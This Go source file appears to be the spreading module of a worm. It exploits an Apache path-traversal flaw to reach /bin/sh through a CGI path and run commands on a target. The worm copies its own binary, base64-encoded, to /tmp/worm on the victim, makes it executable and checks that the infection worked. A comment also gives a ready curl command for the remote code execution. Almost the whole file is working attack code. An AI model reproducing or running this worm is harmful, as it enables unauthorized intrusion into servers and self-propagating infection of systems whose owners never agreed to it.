package infection

import (
	"io/ioutil"
	"log"
	"fmt"
	"net"
	"encoding/base64"
	"strings"
)

//Command execution: curl -X POST localhost:80/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh -d 'echo;ls -l /tmp/worm | wc -l'

var (
	path = "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh"
	copyCommandsTemplate = "echo;echo '%s' | base64 -d > %s;chmod u+x %s;"
	commandsTemplate = "echo;%s"
	wormPath = "/tmp/worm"
)

func PrepareRequest(ip string, commands string) string {
	rt := fmt.Sprintf("POST %s HTTP/1.1\r\n", path)
	rt += fmt.Sprintf("Host: %s\r\n", ip)
	rt += fmt.Sprintf("Connection: close\r\n")
	rt += fmt.Sprintf("Content-Type: text/plain\r\n")
	rt += fmt.Sprintf("Content-Length: %d\r\n",len(commands))
	rt += fmt.Sprintf("\r\n")
	rt += fmt.Sprintf("%s\r\n",commands)
	return rt
}

func ApacheCheckInfection(ip string, port string) bool {
	executeCommands := fmt.Sprintf("ls -l %s", wormPath)
	commands := fmt.Sprintf(commandsTemplate,executeCommands)
	conn, err := net.Dial("tcp", ip+":"+port)
	rt := PrepareRequest(ip, commands)
	_, err = conn.Write([]byte(rt))
	resp, err := ioutil.ReadAll(conn)
    if err != nil {
        log.Fatal(err)
		return false
    }
    conn.Close()
	return strings.Contains(string(resp),wormPath)
}

func ApacheInfect(ip string, port string) bool {
	var worm []byte
	worm = GetFile("/proc/self/exe")
	worm64 := base64.StdEncoding.EncodeToString(worm)
	commands := fmt.Sprintf(copyCommandsTemplate,worm64,wormPath,wormPath)
	conn, err := net.Dial("tcp", ip+":"+port)
	rt := PrepareRequest(ip, commands)
	_, err = conn.Write([]byte(rt))
    if err != nil {
        log.Fatal(err)
		return false
    }

    resp, err := ioutil.ReadAll(conn)
    if err != nil {
        log.Fatal(err)
		return false
    }
	fmt.Println(string(resp))
    conn.Close()
	return ApacheCheckInfection(ip,port)
}